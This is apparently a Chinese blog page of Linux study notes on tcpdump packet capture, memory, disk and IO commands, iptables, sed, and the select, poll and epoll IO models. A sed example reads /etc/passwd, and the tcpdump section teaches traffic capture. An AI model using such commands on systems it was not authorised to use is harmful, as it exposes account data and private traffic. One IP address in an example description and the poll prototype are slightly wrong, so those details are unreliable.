<h2 id="tcp抓包命令"><a href="#tcp抓包命令" class="headerlink" title="tcp抓包命令"></a>tcp抓包命令</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>tcpdump 是一款强大的网络抓包工具，运行在 Linux 平台上。tcpdump 的使用能够帮助我们分析、调试网络数据。但是要想很好地掌握 tcpdump， 就必须对网络报文（TCP/IP协议）有一定的了解。不过对于简单的使用来说，只要有网络基础概念就行了。</p>
<p>作为互联网上经典的的系统管理员必备工具，tcpdump以其强大的功能，灵活的截取策略，成为每个高级的系统管理员分析网络，排查问题等所必备的工具之一。在实际工作中，需要以 root 权限去执行该命令。</p>
<h3 id="常见选项："><a href="#常见选项：" class="headerlink" title="常见选项："></a>常见选项：</h3><ul>
<li><code>-s number</code>：tcpdump 默认只会截取前96字节的内容，要想截取所有的报文内容，就需要使用这个选项，其中number是需要截取的报文字节数，如果是0的话，表示截取报文全部内容；</li>
<li><code>-nn</code>：表示不解析域名，直接显示IP，在 netstat 命令中，也有这个选项；</li>
<li><code>-X</code>：同时使用 hex 和 ascii 显示报文内容；</li>
<li><code>-S</code>：显示绝对的序列号（sequence number），而不是相对编号；</li>
<li><code>-i</code>：指定监听的网卡，如果为-i any则表示监听所有的网卡；</li>
<li><code>-v，-vv，-vvv</code>：显示更多的详细信息；</li>
<li><code>-c number</code>：表示截取 number 个报文，然后结束；</li>
<li><code>-w</code>：将监听到的数据包写入文件中保存，而并不分析和打印出来；</li>
<li><code>-A</code>：只使用 ascii 打印报文的全部数据，不要和 -X 选项一起使用。截取HTTP请求的时候可以用<code>sudo tcpdump -nSA port 80</code></li>
</ul>
<p>在服务器上的网络报文是异常的多，很多时候我们只关注和具体问题有关的数据报文，而这些有用的报文只占到很小的一部分，为了不让我们在报文的海洋里迷失自己，就需要使用 tcpdump 提供的灵活而且功能强大的过滤器。</p>
<p>过滤器也可以简单地分为三类：<code>type</code>，<code>dir</code> 和 <code>proto</code>。</p>
<ul>
<li><code>type</code>：主要用来区分过滤报文源类型，主要由 <strong>host 主机报文，net 网段报文和 port 指定端口的报文</strong>组成；</li>
<li><code>dir</code>：只过滤报文的源地址和目的地址，主要包括 src 源地址和 dst 目的地址；</li>
<li>proto：只过滤报文的协议类型，支持 tcp，udp和 icmp 等；使用的时候可以省略proto关键字：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">tcpdump -i eth1 arp</span><br><span class="line">tcpdump -i eth1 ip</span><br><span class="line">tcpdump -i eth1 tcp</span><br><span class="line">tcpdump -i eth1 udp</span><br><span class="line">tcpdump -i eth1 icmp</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>在进行抓包时，可以使用“与”（<code>and、&amp;&amp;</code>）、“或”（<code>or、||</code>）和“非”（<code>not、!</code>）来将多个条件组合起来</p>
<h3 id="常用功能"><a href="#常用功能" class="headerlink" title="常用功能"></a>常用功能</h3><ul>
<li>写入文件：<code>-w filename 监听内容写入文件</code></li>
<li>监听端口设置：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">port <span class="number">80</span> / tcp port <span class="number">80</span> / udp port <span class="number">80</span> / src port <span class="number">80</span> / dst port <span class="number">80</span> </span><br><span class="line">监听<span class="number">80</span>端口 / tcp80端口 / udp80端口 / 来源端口<span class="number">80</span> / 发往端口<span class="number">80</span></span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ul>
<li>监听IP设置：</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">host <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span> / src <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span> / dst <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span> </span><br><span class="line">监听与主机<span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span>通信内容 / 监听来源自主机内容 / 监听发往主机内容</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ul>
<li>监听指定网络接口：<code>-i eth0 监听eth0接口</code>(执行 <code>tcpdump -D</code> 可以查看支持的接口有哪些）</li>
</ul>
<h3 id="常用样例"><a href="#常用样例" class="headerlink" title="常用样例"></a>常用样例</h3><ul>
<li>命令：<code>tcpdump -i eth1</code><br>说明：监视指定网络接口的数据包</li>
<li>命令：<code>tcpdump host 210.27.48.3</code><br>说明：截获210.27.48.3主机收到的和发出的所有数据包</li>
<li>命令：<code>tcpdump host 210.27.48.4 and (210.27.48.5 or 210.27.48.6)</code><br>说明：截获 210.27.48.3 主机和 210.27.48.5 或者 210.27.48.6 主机进行通信的所有数据包</li>
<li>命令：<code>tcpdump net 192.168.1.0/24</code><br>说明：截获 192.168.1.0/24 整个网络的数据包</li>
<li>命令：<code>tcpdump -i eth0 src host 210.27.48.3</code><br>说明：监视 eth0 网卡上源地址是 210.27.48.3 的所有网络包</li>
<li>命令：<code>tcpdump -i eth0 dst host 210.27.48.3</code><br>说明：监视 eth0 网卡上目的地址是 210.27.48.3 的所有网络包</li>
<li>命令：<code>tcpdump tcp port 23 and host 210.27.48.3</code><br>说明：获取主机 210.27.48.3 上端口为23的应用发出和接收的所有TCP协议包</li>
<li>命令：<code>tcpdump udp port 123</code><br>说明：获取本机 123 端口发出和接收的所有 UDP 协议包</li>
<li>命令：<code>tcpdump src host 10.126.1.222 and dst net 10.126.1.0/24</code><br>说明：截获源主地址为 10.126.1.222，目的地址是 10.126.1.0/24 整个网络</li>
<li>命令：<code>tcpdump -i eth0 -s0 -G 60 -Z root -w %Y_%m%d_%H%M_%S.pcap</code><br>说明：抓取报文后按照指定时间间隔保存；-G选项后面接时间，单位为秒；上述命令就是每隔60秒生存一个文件</li>
<li>命令：<code>tcpdump -i eth0 -s0 -C 1 -Z root -w eth0Packet.pcap</code><br>说明：抓取报文后按照指定报文大小保存；-C选项后接文件大小，单位为MB；上述命令就是每抓包文件达到1MB时就使用一个新的文件保存新抓的报文</li>
</ul>
<h3 id="输出信息说明"><a href="#输出信息说明" class="headerlink" title="输出信息说明"></a>输出信息说明</h3><p>输出示例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/ 时间/ ID号 / IP 是表明该分组是IP分组 /  &gt;表示从主机发送到另一主机的端口（&lt; 表示接收） / FLAFGS是TCP报文中的标志信息 / win表示当前窗口大小 / length表示包的长度</span><br><span class="line"><span class="number">22</span>:<span class="number">04</span>:<span class="number">38.306530</span> IP <span class="number">183.232</span><span class="number">.231</span><span class="number">.172</span>.https &gt; <span class="number">192.168</span><span class="number">.0</span><span class="number">.100</span><span class="number">.61572</span>: Flags [P.], seq <span class="number">578</span>:<span class="number">723</span>, ack <span class="number">3611</span>, win <span class="number">1212</span>, length <span class="number">145</span></span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="内存命令"><a href="#内存命令" class="headerlink" title="内存命令"></a>内存命令</h2><ul>
<li><code>top</code>：用于实时显示 process 的动态</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">PID：进程的ID　　</span><br><span class="line">USER：进程所有者</span><br><span class="line">PR：进程的优先级别，越小越优先被执行</span><br><span class="line">VIRT：进程占用的虚拟内存</span><br><span class="line">RES：进程占用的物理内存</span><br><span class="line">SHR：进程使用的共享内存</span><br><span class="line">S：进程的状态,S表示休眠，R表示正在运行，Z表示僵死状态，N表示该进程优先值为负</span><br><span class="line">%CPU：进程占用CPU的使用</span><br><span class="line">%MEM：进程使用的物理内存和总内存的百分</span><br><span class="line">TIME+：该进程启动后占用的总的CPU时间，即占用CPU使用时间的累加值</span><br><span class="line">COMMAND：进程启动命令名称</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ul>
<li><code>free</code>：查看系统内存使用情况</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">total:总计物理内存的大小</span><br><span class="line">used:已使用多大</span><br><span class="line">free:可用有多少</span><br><span class="line">shared:多个进程共享的内存总额</span><br><span class="line">buff/cached:磁盘缓存的大小</span><br><span class="line">available:可用多少</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ul>
<li><code>m</code>: 查看 RAM 使用情况最简单的方法是通过 <code>/proc/meminfo</code></li>
</ul>
<p>这个动态更新的虚拟文件实际上是许多其他内存相关工具(如：free / ps / top)等的组合显示。</p>
<p>/proc/meminfo 列出了所有你想了解的内存的使用情况。</p>
<p>进程的内存使用信息也可以通过<code>/proc/&lt;pid&gt;/statm</code> 和 <code>/proc/&lt;pid&gt;/status</code> 来查看。</p>
<h2 id="查看磁盘命令"><a href="#查看磁盘命令" class="headerlink" title="查看磁盘命令"></a>查看磁盘命令</h2><ul>
<li><code>df [选项] [文件]</code>:显示指定磁盘的可用空间，没指定则显示当前目录</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">-a  显示全部文件系统</span><br><span class="line">-h  文件大小友好显示</span><br><span class="line">-l  显示本地文件系统</span><br><span class="line">-i  显示inode信息</span><br><span class="line">-T  显示文件系统类型</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<ul>
<li><code>du [选项] [文件]</code>：显示每个文件和目录的磁盘使用空间</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">-h  方便阅读的方式</span><br><span class="line">-s  只显示总和的大小</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="查看-IO-命令"><a href="#查看-IO-命令" class="headerlink" title="查看 IO 命令"></a>查看 IO 命令</h2><ol>
<li>用 top 命令中的 cpu 信息观察：其中 <code>wa</code> 的百分比可以大致的体现出当前的磁盘io请求是否频繁。如果 wa 的数量比较大，说明等待输入输出的的 io 比较多。</li>
<li>vmstat：vmstat 命令报告关于线程、虚拟内存、磁盘、陷阱和 CPU 活动的统计信息。由 vmstat 命令生成的报告可以用于平衡系统负载活动。系统范围内的这些统计信息(所有的处理器中)都计算出以百分比表示的平均值，或者计算其总和。</li>
<li>用iostat，Iostat 是 sysstat 工具集的一个工具，需要安装。<code>r/s</code> 和 <code>w/s</code> 分别是每秒的读操作和写操作，而 <code>rKB/s</code> 和 <code>wKB/s</code> 列以每秒千字节为单位显示了读和写的数据量</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">iostat -dx 显示磁盘扩展信息</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="防火墙命令"><a href="#防火墙命令" class="headerlink" title="防火墙命令"></a>防火墙命令</h2><p>iptables 是一个基于命令行的防火墙工具，它使用规则链来允许/阻止网络流量。当一条网络连接试图在你的系统中建立时，iptables 会查找其对应的匹配规则。如果找不到，iptables 将对其采取默认操作。</p>
<p>iptables 的规则链分为三种：输入、转发和输出。</p>
<ul>
<li>输入：这条链用来过滤目的地址是本机的连接。例如，如果一个用户试图使用 SSH 登陆到你的 PC/服务器，iptables 会首先匹配其 IP 地址和端口到 iptables 的输入链规则。</li>
<li>转发：这条链用来过滤目的地址和源地址都不是本机的连接。例如，路由器收到的绝大数数据均需要转发给其它主机。如果你的系统没有开启类似于路由器的功能，如 NATing，你就不需要使用这条链。</li>
<li>输出：这条链用来过滤源地址是本机的连接。例如，当你尝试 ping howtogeek.com 时，iptables 会检查输出链中与 ping 和 howtogeek.com 相关的规则，然后决定允许还是拒绝你的连接请求。</li>
</ul>
<p>查看防火墙状态：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">service iptables status</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>开启防火墙：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">service iptables start</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>关闭防火墙：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">service iptables stop</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h2 id="sed-命令"><a href="#sed-命令" class="headerlink" title="sed 命令"></a>sed 命令</h2><p>Linux sed 命令是利用脚本来处理文本文件。</p>
<p>sed 可依照脚本的指令来处理、编辑文本文件。</p>
<p>Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件]</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<ul>
<li><code>-e&lt;script&gt;</code> 或 <code>--expression=&lt;script&gt;</code>，以选项中指定的 script 来处理输入的文本文件。</li>
<li><code>-f&lt;script文件&gt;</code> 或 <code>--file=&lt;script文件&gt;</code>，以选项中指定的 script 文件来处理输入的文本文件。</li>
<li><code>-h</code> 或 <code>--help</code> 显示帮助。</li>
<li><code>-n</code> 或 <code>--quiet</code> 或 <code>--silent</code> 仅显示 script 处理后的结果。</li>
<li><code>-V</code> 或 <code>--version</code> 显示版本信息。</li>
</ul>
<p>动作说明：</p>
<ul>
<li>a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～</li>
<li>c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！</li>
<li>d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚；</li>
<li>i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)；</li>
<li>s ：取代，可以直接进行取代的工作,通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！</li>
</ul>
<p>sed 后面接的动作，请务必以 <code>&#39;&#39;</code> 两个单引号括住，示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 在testfile文件的第四行后添加一行，并将结果输出到标准输出</span><br><span class="line">sed -e 4a\newLine testfile </span><br><span class="line"></span><br><span class="line"># 将 &#x2F;etc&#x2F;passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除</span><br><span class="line">nl &#x2F;etc&#x2F;passwd | sed &#39;2,5d&#39;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h1 id="33-Linux的五种IO模型"><a href="#33-Linux的五种IO模型" class="headerlink" title="33. Linux的五种IO模型"></a>33. Linux的五种IO模型</h1><p>在Linux（UNIX）操作系统中，共有五种IO模型：<strong>阻塞IO模型</strong>，<strong>非阻塞IO模型</strong>，<strong>IO复用模型</strong>，<strong>信号驱动IO模型</strong>以及<strong>异步IO模型</strong>。</p>
<p><strong>阻塞和非阻塞</strong></p>
<ul>
<li>阻塞: 一个线程调用一个方法计算 1 - 100 的和，如果该方法没有返回结果， 那么调用方法的线程就一直等待直到该方法执行完毕。</li>
<li>非阻塞: 一个线程调用一个方法计算 1 - 100 的和，该方法立刻返回，如果方法返回没有结果， 调用者线程也无需一直等待该方法的结果，可以执行其他任务，但是在方法返回结果之前， <strong>线程仍然需要轮询的检查方法是否已经有结果。</strong></li>
</ul>
<p><strong>结论: 阻塞与非阻塞针对调用者的立场而言。</strong></p>
<p><strong>同步与异步</strong></p>
<ul>
<li><strong>同步</strong>: 一个线程调用一个方法计算 1 - 100 的和，如果方法没有计算完，就不返回。</li>
<li><strong>异步</strong>: 一个线程调用一个方法计算 1 - 100 的和，该方法立刻返回，但是由于方法没有返回结果， 所以就需要被调用的这个方法来通知调用线程 1 - 100 的结果， 或者线程在调用方法的时候指定一个回调函数来告诉被调用的方法执行完后就执行回调函数。</li>
</ul>
<p><strong>结论:同步和异步是针对被调用者的立场而言的。</strong></p>
<h2 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h2><p>我们常说的IO，指的是文件的输入和输出，但是在操作系统中，一次完整的IO操作，是文件从硬盘中拷贝到用户空间的过程。</p>
<h2 id="阻塞IO模型"><a href="#阻塞IO模型" class="headerlink" title="阻塞IO模型"></a>阻塞IO模型</h2><p>这种模型是最简单的IO模型，一般表现为进程或线程等待某个条件，如果条件不满足，则一直等待下去。条件满足，则进行下一步操作。</p>
<p><a href="http://wx-qiniu.xiaoming.net.cn/%E9%98%BB%E5%A1%9EIO%E6%A8%A1%E5%9E%8B.webp"><img src="http://wx-qiniu.xiaoming.net.cn/%E9%98%BB%E5%A1%9EIO%E6%A8%A1%E5%9E%8B.webp" alt="阻塞IO模型"></a></p>
<p>应用进程通过系统调用通过<code>recvfrom</code>接受数据，但由于内核还未准备好数据报，应用进程就会阻塞住，直到内核准备好数据报，<code>recvfrom</code>完成数据报复制工作，应用进程才能结束阻塞状态。</p>
<p>这种方式实现简单，但是比较耗费时间，比较适合那种并发低，时效性要求低的场景。</p>
<p><strong>阻塞 IO 是同步阻塞的。</strong></p>
<ol>
<li>阻塞 IO 的同步体现在: <strong>内核只有准备好数据并把数据复制到用户应用进程才会返回。</strong></li>
<li>阻塞 IO 的阻塞体现在:<strong>用户应用进程等待内核准备数据和把数据从用户态拷贝到内核态的这整个过程， 用户应用进程都必须一直等待。</strong> 当然,如果是本地磁盘 IO,内核准备数据的时间可能会很短。但网络 IO 就不一样了，因为服务端不知道客户端何时发送数据，内核就仍需要等待 socket 数据，时间就可能会很长。</li>
</ol>
<p><strong>阻塞 IO 的优点是对于数据是能够保证无延时的，因为应用程序进程会一直阻塞直到 IO 完成。</strong>但应用程序的阻塞就意味着应用程序进程无法执行其他任务，这会大大降低程序性能。一个不太可行的办法是为每个客户端 socket 都分配一个线程，这样就会提升 server 处理请求的能力。不过操作系统的线程资源是有限的，如果请求过多，可能造成线程资源耗尽，系统卡死等后果。</p>
<h2 id="非阻塞IO模型"><a href="#非阻塞IO模型" class="headerlink" title="非阻塞IO模型"></a>非阻塞IO模型</h2><p>应用进程与内核交互，目的未达到之前，不再一味的等待，而是直接返回。然后通过轮询的方式，不停的去问内核数据准备有没有准备好。如果某一次轮询发现数据已经准备好了，那就把数据拷贝到用户空间。</p>
<p><a href="http://wx-qiniu.xiaoming.net.cn/%E9%9D%9E%E9%98%BB%E5%A1%9EIO%E6%A8%A1%E5%9E%8B.webp"><img src="http://wx-qiniu.xiaoming.net.cn/%E9%9D%9E%E9%98%BB%E5%A1%9EIO%E6%A8%A1%E5%9E%8B.webp" alt="非阻塞IO模型"></a></p>
<p>应用进程通过<code>recvfrom</code>调用不停的去和内核交互，直到内核准备好数据。如果没有准备好，内核会返回<code>error</code>,应用进程在得到<code>error</code>后，过一段时间再发送<code>recvfrom</code>请求。在两次请求的时间段，进程可以先做别的事情。</p>
<p>非阻塞 IO 的非阻塞体现在: <strong>用户应用进程不用阻塞在对内核的系统调用上</strong></p>
<p>非阻塞 IO 的优点在于用户应用进程在轮询阶段可以执行其它任务。但这也是它的缺点，轮询就代表着用户应用进程不是时刻都会发起系统调用。 <strong>可能数据准备好了，而用户应用进程可能等待其它任务执行完毕才会发起系统调用，这就意味着数据可能会被延时获取。</strong></p>
<h2 id="信号驱动的IO模型"><a href="#信号驱动的IO模型" class="headerlink" title="信号驱动的IO模型"></a>信号驱动的IO模型</h2><p>应用程序在读取文件时通知内核，如果某个<code>socket</code>的某个事件发生时，就向应用程序发一个信号。在收到信号后，信号对应的处理函数会进行后续处理。</p>
<p><strong>用户应用进程发起 sigaction 系统调用,内核收到并立即返回。用户应用进程可以继续执行其他任务，不会阻塞。当内核准备好数据后向用户应用进程发送 SIGIO 信号，应用进程收到信号后，发起系统调用，将数据从内核拷贝到用户进程，</strong> 然后进行数据处理。</p>
<p><a href="http://wx-qiniu.xiaoming.net.cn/%E4%BF%A1%E5%8F%B7%E9%A9%B1%E5%8A%A8IO%E6%A8%A1%E5%9E%8B.webp"><img src="http://wx-qiniu.xiaoming.net.cn/%E4%BF%A1%E5%8F%B7%E9%A9%B1%E5%8A%A8IO%E6%A8%A1%E5%9E%8B.webp" alt="信号驱动的IO模型"></a></p>
<p>应用程序预先向内核注册一个信号处理函数，然后用户进程返回，并不阻塞，当内核数据准备就绪时就会发送一个信号给进程，用户便在信号处理函数中开始把数据拷贝到用户空间中。</p>
<h2 id="IO复用模型"><a href="#IO复用模型" class="headerlink" title="IO复用模型"></a>IO复用模型</h2><p>多个进程的IO可以注册到同一个管道上，这个管道会统一和内核进行交互。当管道中的某一个请求需要的数据准备好之后，进程再把对应的数据拷贝到用户空间中。</p>
<p><a href="http://wx-qiniu.xiaoming.net.cn/IO%E5%A4%8D%E7%94%A8%E6%A8%A1%E5%9E%8B.webp"><img src="http://wx-qiniu.xiaoming.net.cn/IO%E5%A4%8D%E7%94%A8%E6%A8%A1%E5%9E%8B.webp" alt="IO复用模型"></a></p>
<p>IO多路转接是多了一个<code>select</code>函数，多个进程的IO可以注册到同一个<code>select</code>上，当用户进程调用该<code>select</code>,<code>select</code>会监听所有注册好的IO，如果所有被监听的IO需要的数据都没有好时，<code>select</code>调用进程会阻塞。当任意一个IO所需的数据准备好之后，<code>select</code>调用就会返回，然后进程在通过<code>recvfrom</code>来进行数据拷贝。</p>
<p>这里的IO复用模型，并没有向内核注册信号处理函数，所以，它并不是非阻塞的。进程在发出<code>select</code>后，要等到<code>select</code>监听的所有IO操作中至少有一个需要的数据准备好，才会有返回，并且也需要再次发送请求去进行文件的拷贝。</p>
<p><strong>IO 多路复用模型是同步阻塞的</strong></p>
<ol>
<li>IO 多路复用模型的同步体现在: <strong>select 函数只有监听到某个 socket 有事件才会返回。</strong></li>
<li>IO 多路复用模型的阻塞体现在: <strong>用户应用进程会阻塞在对 select 函数上的调用上。</strong></li>
</ol>
<p><strong>IO 多路复用的优点在于内核可以处理多个 socket，相当于一个用户进程(线程)就可以处理多个 socket 连接。</strong></p>
<p>这样不仅降低了系统的开销，并且对于需要高并发的应用是非常有利的。而非阻塞 IO 和阻塞 IO 的一个用户应用进程只能处理一个 socket，要想处理多 socket，只能新开进程或线程，但这样很消耗系统资源。</p>
<p><strong>PS: 在 IO 多路复用模型中, socket 一般应该为非阻塞的，这就是 Java 中 NIO 被称为非阻塞 IO 的原因。但实际上 NIO 属于 IO 多路复用，它是同步阻塞的 IO。</strong></p>
<h3 id="实现（Select-Poll-Epoll-区别）"><a href="#实现（Select-Poll-Epoll-区别）" class="headerlink" title="实现（Select/Poll/Epoll 区别）"></a>实现（Select/Poll/Epoll 区别）</h3><p><code>select/poll/epoll</code>都是I/O多路复用的具体实现，<code>select</code>出现的最早，之后是<code>poll</code>，再然后是<code>epoll</code>。</p>
<p>select，poll，epoll 都是IO多路复用的机制。I/O多路复用就通过一种机制，可以监视多个描述符，一旦某个描述符就绪（一般是读就绪或者写就绪），能够通知程序进行相应的读写操作。但select，poll，epoll本质上都是同步 I/O，因为他们都需要在读写事件就绪后自己负责进行读写，也就是说这个读写过程是阻塞的，而异步I/O则无需自己负责进行读写，异步I/O的实现会负责把数据从内核拷贝到用户空间。</p>
<blockquote>
<p>文件描述符：文件描述符（File descriptor）是计算机科学中的一个术语，是一个用于表述指向文件的引用的抽象化概念。<br>文件描述符在形式上是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。</p>
</blockquote>
<h4 id="select"><a href="#select" class="headerlink" title="select"></a>select</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 数据结构 (bitmap)</span></span><br><span class="line">typedef struct &#123;</span><br><span class="line">    unsigned long fds_bits[__FDSET_LONGS];</span><br><span class="line">&#125; fd_set;</span><br><span class="line"></span><br><span class="line">int select(int n, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout);</span><br><span class="line"></span><br><span class="line">FD_ZERO(int fd, fd_set* fds)   <span class="comment">// 清空集合</span></span><br><span class="line">FD_SET(int fd, fd_set* fds)    <span class="comment">// 将给定的描述符加入集合</span></span><br><span class="line">FD_ISSET(int fd, fd_set* fds)  <span class="comment">// 判断指定描述符是否在集合中 </span></span><br><span class="line">FD_CLR(int fd, fd_set* fds)    <span class="comment">// 将给定的描述符从文件中删除</span></span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p><code>select</code>允许应用程序监视一组文件描述符，等待一个或者多个描述符成为就绪状态，从而完成I/O操作。select()的机制中提供一种 <code>fd_set</code> 的数据结构，实际上是一个 long 类型的数组，每一个数组元素都能与一打开的文件句柄（不管是 Socket 句柄,还是其他文件或命名管道或设备句柄）建立联系，建立联系的工作由程序员完成，当调用 select() 时，由内核根据 IO 状态修改 fd_set 的内容，由此来通知执行了 select() 的进程哪一 Socket 或文件可读。</p>
<p>从流程上来看，使用select函数进行IO请求和同步阻塞模型没有太大的区别，甚至还多了添加监视socket，以及调用select函数的额外操作，效率更差。但是，使用select以后最大的优势是用户可以在一个线程内同时处理多个socket的IO请求。用户可以注册多个socket，然后不断地调用select读取被激活的socket，即可达到在同一个线程内同时处理多个IO请求的目的。而在同步阻塞模型中，必须通过多线程的方式才能达到这个目的。</p>
<ul>
<li><code>fd_set</code>使用数组实现，数组大小使用<code>FD_SETSIZE</code>定义，所以只能监听少于<code>FD_SETSIZE</code>数量的描述符。有三种类型的描述符类型：<code>readset</code>,<code>writeset</code>,<code>exceptset</code>，分别对应读、写、异常条件的描述符集合。</li>
<li><code>timeout</code>为超时参数，调用<code>select</code>会一直阻塞直到有描述符的事件到达或者等待的时间超过<code>timeout</code>。</li>
<li>成功调用返回结果大于0，出错返回结果为-1，超时返回结果为0</li>
</ul>
<p><code>select</code>的调用过程如下：</p>
<ol>
<li>使用<code>copy_from_user</code>从用户空间拷贝<code>fd_set</code>到内核空间</li>
<li>注册回调函数<code>__pollwait</code></li>
<li>遍历所有<code>fd</code>，调用其对应的<code>poll</code>方法（对于<code>socket</code>，这个<code>poll</code>方法是<code>sock_poll</code>，<code>sock_poll</code>根据情况会调用到<code>tcp_poll</code>,<code>udp_poll</code>或者<code>datagram_poll</code>）</li>
<li>以 <code>tcp_poll</code> 为例，其核心实现就是<code>__pollwait</code>，也就是上面注册的回调函数。</li>
<li><code>__pollwait</code> 的主要工作就是把 <code>current</code> （当前进程）挂到设备的等待队列中，不同的设备有不同的等待队列，对于<code>tcp_poll</code>来说，其等待队列是 <code>sk-&gt;sk_sleep</code> （注意把进程挂到等待队列中并不代表进程已经睡眠了）。在设备收到一条消息（网络设备）或填写完文件数据（磁盘设备）后，会唤醒设备等待队列上睡眠的进程，这时 <code>current</code> 便被唤醒了。</li>
<li><code>poll</code>方法返回时会返回一个描述读写操作是否就绪的<code>mask</code>掩码，根据这个<code>mask</code>掩码给<code>fd_set</code>赋值。</li>
<li>如果遍历完所有的fd，还没有返回一个可读写的mask掩码，则会调用 <code>schedule_timeout</code> 使调用<code>select</code>的进程（也就是<code>current</code>）进入睡眠。当设备驱动发现自身资源可读写后，会唤醒其等待队列上睡眠的进程。如果超过一定的超时时间（<code>schedule_timeout</code>指定），还是没人唤醒，则调用 select 的进程会重新被唤醒获得CPU，进而重新遍历 <code>fd</code>，判断有没有就绪的 <code>fd</code>。</li>
<li>把 <code>fd_set</code> 从内核空间拷贝到用户空间。</li>
</ol>
<p>select 的缺点：</p>
<ul>
<li>每次调用select，都需要把 fd 集合从用户态拷贝到内核态，这个开销在 fd 很多时会很大</li>
<li>同时每次调用 select 都需要在内核遍历传递进来的所有 fd，这个开销在 fd 很多时也很大</li>
<li>select 支持的文件描述符数量太小了，默认是1024</li>
</ul>
<h4 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">int poll(struct pollfd *fds,unsigned int timeout)</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<p><code>poll</code>功能与<code>select</code>类似，也是等待一组描述符中的一个成为就绪状态。<br><code>poll</code>中描述符是<code>pollfd</code>类型的数组，<code>pollfd</code>定义如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">struct pollfd &#123;</span><br><span class="line">    int fd;           <span class="comment">/* file descriptor */</span></span><br><span class="line">    short events;     <span class="comment">/* requested events */</span></span><br><span class="line">    short revents;    <span class="comment">/* returned events */</span></span><br><span class="line">&#125;</span><br><span class="line">Copy</span><br></pre></td></tr></table></figure>

<h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><ol>
<li><strong>功能</strong>：<code>select</code>和<code>poll</code>的功能基本相同，不过在一些实现细节上有所不同。</li>
</ol>
<ul>
<li><code>select</code>会修改描述符，而<code>poll</code>不会；</li>
<li><code>select</code>的描述符类型使用数组实现，<code>FD_SETSIZE</code>大小默认为 1024，因此默认只能监听 1024 个描述符。如果要监听更多描述符的话，需要修改<code>FD_SETSIZE</code>之后重新编译；而<code>poll</code>没有描述符数量的限制；</li>
<li><code>poll</code>提供了更多的事件类型，并且对描述符的重复利用上比<code>select</code>高。</li>
<li>如果一个线程对某个描述符调用了 select 或者 poll，另一个线程关闭了该描述符，会导致调用结果不确定。</li>
</ul>
<ol>
<li><strong>速度</strong>：<code>select</code>和<code>poll</code>速度都比较慢，每次调用都需要将全部描述符从应用进程缓冲区复制到内核缓冲区。</li>
<li><strong>可移植性</strong>：几乎所有的系统都支持 select，但是只有比较新的系统支持 poll。</li>
</ol>
<h4 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h4><p>epoll 是对 select 和 poll 的改进，epoll提供了三个函数: <code>epoll_create</code>,<code>epoll_ctl</code> 和 <code>epoll_wait</code>。</p>
